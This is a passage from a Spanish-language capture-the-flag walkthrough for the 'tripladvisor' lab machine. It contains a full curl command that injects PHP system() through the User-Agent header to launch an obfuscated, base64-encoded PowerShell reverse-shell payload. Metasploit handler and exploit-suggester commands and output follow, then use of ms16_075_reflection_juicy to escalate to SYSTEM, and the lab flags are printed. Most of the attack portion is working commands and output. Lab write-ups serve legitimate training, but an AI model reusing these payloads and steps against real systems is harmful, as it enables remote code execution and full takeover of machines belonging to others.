AEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
```

Por lo que el `curl` tendremos que prepararlo de la siguiente forma:

```shell
curl -A "<?php system('powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoACgAJwAnAEgANABzAEkAQQBEAEwAaQA1ADIAYwBDAEEANwBWAFgANwBXAHsAMAB9AGkAUwBCAHsAMQB9AC8AdgBzAG4AewAwAH0ARAAyAFIAewAxAH0ASQBxAFoAVwBzAEwAVgBkAHIAOABrAG0AQgA0ACcAJwArACcAJwBnAFYAcQAxADAAcABpAGwAWABYAFgAQwBnAE0ATQBHAFUAWQBYAEIAaQBxAGQAbQAvAC8AOQAzAHMARwB0AEMAOQBwAHUAOQBlADcAWgBPAGMATAB6AHMAegB6AE4AcgAvAG4AVgBUAHsAMAB9AG4ATABzAE0ASgBGAFcANwBhAEYAMABmAEMAewAxAH0ANAA4AGYAaABOADAAYQBPAGEAawBUAEMAMgBJAEYAdABlAHkANgBVAEkAbAB2AGEANAA5AFgAbABWAGcAVgB2AGcAewAxAH0AaQBRAGwAbQB0AE8AawBuAHMAWQBMAG8AOABPADkAUAB5AE4ARQBXAFUAbABmAHYARwBPAFcASgBLAGwAcQBIADQAaABtAEMAVQBpAFQAWABoAGIAMgBFAGEAbwBoAFEAZABmAHIAMgA1AFIAUwA0AFQAZgBnAGkAVgB2AHgAcgBuAEoATABsAHgAeQBJADUAcwBxAHoAbAB1AGkASQBSAEQAaABYAHIAOABiAHAAQwA0AEQAcgBlAHEAWQBhADAASQBaAG0ATAAxADIANwBkAHEAYgBYAEgAWQBYAEQAYgAwADcANwBsAEQATQByAEYAcQBiAFQATwBHADQAbwBaAEgAUwBMAFUAbQAvAEsAeAB4AGgAZQBQAHQAJwAnACsAJwAnAEMAbwBuAFYASQBYAGIAVABKAEUAdAA4ADEAcABoAGkAZQBuAHoAVQBtAE4ARABNADgAZABFAGwAUwBMAHQARABRADgAVABDAHgATQB1AHEAOABKAFQASAB4ADYAUwBJADUAUwBuAGwAYgB7ADAAfQBKAEMAUwBoAEsAeABDAHsAMQB9ADkASABhAGUASQBxAG4AcABlAGkATABLAHYAVwBoAFEAVQBYAHYAMQBnAHUALwB4AFEAWABPADkAMQBYAE8AVwBVADQAUgBnADIARABNAHAAUQBtAEsAdwB1AGwAZAA5AGgARgBXAGEAUABuAFUASQB7ADAAfQBnAEsAewAwAH0AUQB2AGcAYwB0AGkASwBhAGIAQgBzAGwAWQBEAHMAcgBzAGsAUQBtAEsARgAnACcAKwAnACcANQBvAFQAVQBoAGYAOABpAFIAcgB4AEUANgB6ADEAeQA3ADIAVQBTAG4AegBJAEIAMQBZAGkAbAB0AFQAcAA0ADgAOABVAHIAaAA0AG0AWABFADEAVAAnACcAKwAnACcAeQBWAFYAOAB4AGsALwB1AC8AQgBxAHUATQBBAFUARAB1AEoAdwBmAFAAMwAwAGYATgB5AGgAdQAzADEANgB7ADAAfQAnACcAKwAnACcARQB6AGUAUABCAGYAaQAyAEsARwB3AFQAMgBpAHEATQBrAHcAdwBYADMARgAwAEcAdQBDADAAUABRADcAYgBBAGsAMwBjAEsAMgBNAGsANQB6AFYARgBzAHsAMAB9AG8AQwAnACcAKwAnACcAMQBVAC8AJwAnACsAJwAnAE4AbQBKACcAJwArACcAJwBXAFgAewAwAH0AdgB0AE8AYQBlAEYAUgBpAEQAZABOADEAdgB3AHQAbgBDAFQAcgBDADMAZgBKAFQAdwB6AFAAawBWADEATwBNAGsAYgB3AGQAeQBCAC8AbQBZAG8AcwA2AFcATwB7ADEAfQBGADIAOQA3AEUAcQB2AHUAWQBSADUAQgBOAFUAWQBOAEwAWQBrADEAMgBDAGcAVwBKADEAZAA0AEcAOABEAGkASQBvAGMAQgBoAEgAbQBRAGYARwBDAHoAWQA5AHgAdQB5AEIAVgA4ADAAeAA4ACcAJwArACcAJwBWAEMAcQB1AE8ARAAnACcAKwAnACcAVgBEAEsAdwBDAGgAOQBlAGUARwAxAE0ANgBUAHEAdwBhAGQASQBoAGkAUQBLAC8AYwBRADYAUgBXAGYATQBnAFEAdABLAGYAZQBaAGMAVgAyAHIANQAzAHYAZwBhAGkAcQBFAFMAZgBMADYAcwBJAG8AaAB4AFIAMQA2ADQASwBGAEgASQBLADgAdQBxAEQAUQBEAE8AewAwAH0AdQBsAEoAdwBsAHgAYwAvAHEAbwA3AG4ARABuAEQARABzAE8AaABuAGIAJwAnACsAJwAnAGkAMQB2AFcAbgBvAEcANQBVADYAbwBsAE4ARwBOAHAANwBvAEoAWABBAFkAQwB4AHQAVQBJAHUAZABnAHsAMQB9AEgAbwB5ADcAMABzAEkAZgBVAHIAWQBXAEQAdgBmAEwAcQBxADIAaABvAEQAaQBHAFEATwBTAEQAcABEAHIAdwBCAEoAeAB3AEYAaQAvAEYAWQBTAGIAMQA2AEcAUgBlADEAaABvAFcAWQBFAGEAOABJAGkAbwBHAG0ASwBCAGgAZAA0AGcAUgBRAEgAbgBiADUAVQBRAFMAJwAnACsAJwAnAFgARQB5AEMAdgB7ADAAfQBxAHEAWgB7ADAAfQB6AFEAbwBZADUANgB7ADEAfQBzAG8AZgB7ADEAfQBpAFoASABnAGEAbwBzAGsAcgBDADcAWQBPAEcAVgBRAGYARAB7ADEAfQBDAFIAVwB6ADkATAB5AE4AZQAxAGgAMgB3AFIAawB2AFIAegB7ADEAfQBQAGkAUABzAEUAVwA2AHAAYgB4AEIAJwAnACsAJwAnAEsAaQBzAFQAcgBUAFcATwBZAC8AUgBIAFUAUQBGAEkAQwBrAEQATQBMAHAAcABFAHEAdABPAGgAawA1AGIAWgBaAEUAUgBQADAAawA2ADcAcAB5AE0ATwBzAG0AOQBBAGsAdgB2AFgAcABtADIAYQBrADAAbQB3AFUAWQBtAGMAMgBJAFoAegBKAHIAcABlAEQAQQBKAFEAdwBNADMAewAxAH0AYwBCAFMARABvADYAdABhAEgAVQA1AGQASQBtAEIAewAxAH0ALwB1AG0AMQBlAGsAcABhAFcAYwBUAHsAMAB9AG8AcQBSAEcAWABwAFAAMwBaAHAATgBWAFgARgA3AHsAMAB9AEwAUABkAFYAeQBjAFQANABNAFAAYQB3AEwAegBkAEcASQBxAG4AJwAnACsAJwAnAHgAcwBGADEATQBOAFAAVwB4AGkAaQA4AE4AawBDAFIATgBnAGkATQBBAEwANgBxAEUAYgBxAHEAUABKAGMARABWAGUANQBxAEEAMABzAE4AZABTAHcAcgBnAFcAWAAyAHoARgBaAHoAWAB1AGkAUgAyAGsAVABGADkANQBaAGgASwBiADEAcABvAGUAOQBCAHsAMQB9ADkANQBxADkAYQA0ADMAWQB7ADAAfQBWAHkAMgBGAGYAQwA3AGwAZQB2ADIAegB6AHEARgB2AHcAUgA1ADUAOQBIADUANABPAE8AWAB1AHgAZAB2AHsAMQB9AGQAbgBtAFkANQAxADAASwBOADMAWgA2AFkAZABvACcAJwArACcAJwBxAG0AOQBVAHEAZAA2AGQAMgA3AGEASwB5AE0ANABXAEEAZQBtAFAAWgBCAGEAMwBWAEMARgBjAHcATgB2AEIAaQB0AEwAZwB0AFYAcwA5AHUAewAwAH0AbwBkAHoAOABrADcAZgBzAGgAbQBHAHYAYQA4AHoANQBHAGMAeQBOAEEAMgAwAEEAeABGAGMAVwBhAFUAVwBMAGQAcgBEAFYARgBQAFEAbgBYAEYANABFAGEAUgBkADAASgBuAEUAVgB7ADEAfQBnADIANwBNACcAJwArACcAJwBtADkAWABRADIAOAA1ADYAMABoAC8AMgBFAEsATgBWAG8AcABpADYAbwBuAFEASgA1AEcAaQBzAE8ATwB1AE8AMQBKAHcAbQBGADYAWgA5AFkAawA1ADAAZQBiAE8AZAB5AEoAdQAxAGYAaQB1AHQAZABkAHgAZgBSADcAdgB2ADUAUAB6ADAATgBKAEQAOAAxAGsAaQB5AEwAWQBQADIAbgBGAEEARgBlADcAZgA5AFYAbwBUADcAQgAzAEEAWABPADcAWQA4ADgAeQBXAGIANAA2AGQARgBWAEwAcQBuADEAewAwAH0AUwAwAFAAeQB3AHcAaABmAGUAWQB3AEkAUABIADQAMQA3AGYAQwBhADYAQQByAHsAMAB9AFIAUgBHAEQAVwB1AEoAYwBrAE8AcABFAEQAeABpAFcAMABFAGIAVABPACcAJwArACcAJwA0AFQAdQBpAFIARQA0AEgAcwBhAGEAQwBBAGgAZgBCAEcAOABMAFgAZgBOAHcAQgA3AE4AUwBjADQAbQBoAHgAYwBTADgAMABKADIAQwBQAEgALwBZADMATQBiAFkAMwA3AGIAWgBCADMARgBMADAAaQAwAHcAbwBCAFcAMgAvAHUASwBDAHEAMwBRADUAMgBlAEoAOABvADAATwB7ADEAfQAvAFYAdAB1ADMAUgBFAE4ANQBoAE4AMABFAG0AdABmAFAAeAB0AEEAYwB5AHcAZQBZADgAYQBuAE8AWQB3AGIAYwBkAFMANgBQAG4AbABuAEYAOQA1AE4AMQBjAHEAZABLAEIATgAzAE0AQwBkAFcANgA1AHYAdABZAGUAVABMAEYAOQBKADkAbQBmAEkATQBvAFgARQAwAHoAWgA4AGQARwB5AFEAewAxAH0ALwBMAEYANgBlADgARQAzAHoAOABVAEwAbQAnACcAKwAnACcATgBSAGsAOQBDAC8AYQAwAG0ATgAzAFQAUwBMAEgAUQBJAHAAQQAnACcAKwAnACcARAAwAHIAMwAwAGgANgBpAFoAcABkADkAZQBVAFIAZwBuAG0ASABLAEoAWQB7ADEAfQBEAFEAUgBTAGkAawBpAE0AQQBuAEEAcgBMAEQAUABZAFkAVwBRAHgATwBYADkAcwBHAHgAZgAwAEkAegBMAEYAcwBrADcAOQBzAFEAbwA3AEgAcgB0AFYAMAAxADQASQBLAHcAOQB0AHMAcgA5ADAAZABuAFoASABNAHkARQBxAGwAQwBrAGIARwBPAEEAYQBNAEQAQwB1AHIAdwA1AGwAbQBYAG8AYwB2AEoARwBiAGgAWAA1AC8ALwA3ACcAJwArACcAJwBYAGEAYwBsAHEASwA1AGIAUwA2AHIAeABSAGMAbgBnAGUAeABKAE4AQwBQAEUAewAxAH0ARQB2AGkAQwBLAHYAeAA4AHkAbQBJAFkAWQBsAE8AWgBmAGcAUABZAFcAZgBxAEEAOABnAG0ASQBLAHQAYgAyAHMAYwBCAHgARgBOAFUAbgBJAFUAdwB6AEwAcAB6ADMARQB4AEQATQBFAEEAYgBvAG0AdgBIADcAQgBSADYARQB5AFcAawBEAEUASQBmAG8AdQBWAEIAZwBmAEYAcAA0AE8ASAB4AFcAcQAvADkANwA0ADIAVgBYAHEARQBEADcAZQB2ADgAYgBQADQAOQBrAHYAYgB0ADgAVgBVADMASwA5AEEATwB7ADEAfQBGADYAZgBPAEQASgB6ADMAdQBOADAASQB3AGQAVABBAEQAUwBnAHMANgBEAGsASABsAEQAUABRAEcARQByAHUAawBlAFQAcABVADYAcABBAFAALwBtADcAeABmAHcAVgBmAGMAMwBaADQAQwBaAE4AbQAwAGYAJwAnACsAJwAnAFgAewAwAH0AQQBWAEIAVwA0AHkAMgBMAEQAQQBBAEEAJwAnACkALQBmACcAJwArACcAJwAsACcAJwBqACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA'); ?>" http://tripladvisor:8080/wordpress
```

Antes de enviarlo, nos pondremos a la escucha con `metasploit`.

```shell
msfconsole -q
```

Dentro utilizaremos el `multi/handler`:

```shell
use multi/handler
```

Y lo configuraremos de la siguiente forma:

```shell
set PAYLOAD 
set LHOST <IP_ATTACKER>
set LPORT <PORT>
run
```

Ahora si enviamos el `payload` del `curl` y volvemos a donde tenemos la escucha en `metasploit` veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.1.146:7777 
[*] Sending stage (203846 bytes) to 192.168.1.161
[*] Meterpreter session 1 opened (192.168.1.146:7777 -> 192.168.1.161:49175) at 2025-03-29 08:12:13 -0400

meterpreter > getuid
Server username: TRIPLADVISOR\websvc
```

Vemos que ha funcionado y seremos el usuario `websvc`, por lo que leeremos la flag del usuario.

> user.txt

```
4159a2b3a38697518722695cbb09ee46
```

## Escalate Privileges

Vamos a utilizar un modulo de `metasploit` para poder identificar diferentes vulnerabilidades a nivel `local` que pueda tener la maquina victima.

Antes tendremos que dejar la sesion en segundo plano haciendo `Ctrl+Z` y dandole a la `Y`.

```shell
use post/multi/recon/local_exploit_suggester
```

Ahora lo configuraremos de la siguiente forma:

```shell
set SESSION <ID_SESSION>
set SHOWDESCRIPTION true
run
```

Info:

```
[*] 192.168.1.161 - Collecting local exploits for x64/windows...
[*] 192.168.1.161 - 198 exploit checks are being tried...
[+] 192.168.1.161 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
  This module will bypass Windows UAC by creating COM handler registry 
  entries in the HKCU hive. When certain high integrity processes are 
  loaded, these registry entries are referenced resulting in the 
  process loading user-controlled DLLs. These DLLs contain the 
  payloads that result in elevated sessions. Registry key 
  modifications are cleaned up after payload invocation. This module 
  requires the architecture of the payload to match the OS, but the 
  current low-privilege Meterpreter session architecture can be 
  different. If specifying EXE::Custom your DLL should call 
  ExitProcess() after starting your payload in a separate process. 
  This module invokes the target binary via cmd.exe on the target. 
  Therefore if cmd.exe access is restricted, this module will not run 
  correctly.
[+] 192.168.1.161 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when the Windows Event Viewer is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked. The module does not require the 
  architecture of the payload to match the OS. If specifying 
  EXE::Custom your DLL should call ExitProcess() after starting your 
  payload in a separate process.
[+] 192.168.1.161 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
  This module exploits CVE-2019-1458, an arbitrary pointer dereference 
  vulnerability within win32k which occurs due to an uninitalized 
  variable, which allows user mode attackers to write a limited amount 
  of controlled data to an attacker controlled address in kernel 
  memory. By utilizing this vulnerability to execute controlled writes 
  to kernel memory, an attacker can gain arbitrary code execution as 
  the SYSTEM user. This module has been tested against Windows 7 x64 
  SP1. Offsets within the exploit code may need to be adjusted to work 
  with other versions of Windows. The exploit can only be triggered 
  once against the target and can cause the target machine to reboot 
  when the session is terminated.
[+] 192.168.1.161 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
  This module exploits CVE-2020-0787, an arbitrary file move 
  vulnerability in outdated versions of the Background Intelligent 
  Transfer Service (BITS), to overwrite 
  C:\Windows\System32\WindowsCoreDeviceInfo.dll with a malicious DLL 
  containing the attacker's payload. To achieve code execution as the 
  SYSTEM user, the Update Session Orchestrator service is then 
  started, which will result in the malicious 
  WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a 
  DLL hijacking issue within the Update Session Orchestrator Service. 
  Note that presently this module only works on Windows 10 and Windows 
  Server 2016 and later as the Update Session Orchestrator Service was 
  only introduced in Windows 10. Note that only Windows 10 has been 
  tested, so your mileage may vary on Windows Server 2016 and later.
[+] 192.168.1.161 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
  This module exploits CVE-2020-1054, an out of bounds write reachable 
  from DrawIconEx within win32k. The out of bounds write can be used 
  to overwrite the pvbits of a SURFOBJ. By utilizing this 
  vulnerability to execute controlled writes to kernel memory, an 
  attacker can gain arbitrary code execution as the SYSTEM user. This 
  module has been tested against a fully updated Windows 7 x64 SP1. 
  Offsets within the exploit code may need to be adjusted to work with 
  other versions of Windows.
[+] 192.168.1.161 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
  A use after free vulnerability exists in the `NtGdiResetDC()` 
  function of Win32k which can be leveraged by an attacker to escalate 
  privileges to those of `NT AUTHORITY\SYSTEM`. The flaw exists due to 
  the fact that this function calls `hdcOpenDCW()`, which performs a 
  user mode callback. During this callback, attackers can call the 
  `NtGdiResetDC()` function again with the same handle as before, 
  which will result in the PDC object that is referenced by this 
  handle being freed. The attacker can then replace the memory 
  referenced by the handle with their own object, before passing 
  execution back to the original `NtGdiResetDC()` call, which will now 
  use the attacker's object without appropriate validation. This can 
  then allow the attacker to manipulate the state of the kernel and, 
  together with additional exploitation techniques, gain code 
  execution as NT AUTHORITY\SYSTEM. This module has been tested to 
  work on Windows 10 x64 RS1 (build 14393) and RS5 (build 17763), 
  however previous versions of Windows 10 will likely also work.
[+] 192.168.1.161 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 192.168.1.161 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 192.168.1.161 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
  This module exploits the lack of sanitization of standard handles in 
  Windows' Secondary Logon Service. The vulnerability is known to 
  affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
  module will only work against those versions of Windows with 
  Powershell 2.0 or later and systems with two or more CPU cores.
[+] 192.168.1.161 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. Currently the 
  module does not spawn as SYSTEM, however once achieving a shell, one 
  can easily use incognito to impersonate the token.
[+] 192.168.1.161 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
  This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. It requires a 
  CLSID string. Windows 10 after version 1803, (April 2018 update, 
  build 17134) and all versions of Windows Server 2019 are not 
  vulnerable.
[*] Running check method for exploit 47 / 47
[*] 192.168.1.161 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                              
 5   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!                                                                                                                         
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
```

Vemos que puede tener varias vulnerabilidades, entre ellas la que mas nos llama la atencion es la siguiente:

```
[+] 192.168.1.161 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
  This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. It requires a 
  CLSID string. Windows 10 after version 1803, (April 2018 update, 
  build 17134) and all versions of Windows Server 2019 are not 
  vulnerable.
```

Por lo que vamos a utilizarlo.

```shell
use exploit/windows/local/ms16_075_reflection_juicy
```

Ahora lo tendremos que configurar de la siguiente forma:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set SESSION <ID_SESSION>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.1.146:6666 
[+] Target appears to be vulnerable (Windows 2008 R2)
[*] Launching notepad to host the exploit...
[+] Process 2744 launched.
[*] Reflectively injecting the exploit DLL into 2744...
[*] Injecting exploit into 2744...
[*] Exploit injected. Injecting exploit configuration into 2744...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.1.161
[*] Meterpreter session 3 opened (192.168.1.146:6666 -> 192.168.1.161:49181) at 2025-03-29 08:29:27 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Como vemos ya seremos `administradores` por lo que leeremos la flag del `admin`.

> root.txt

```
5b38df6802c305e752c8f02358721acc
```
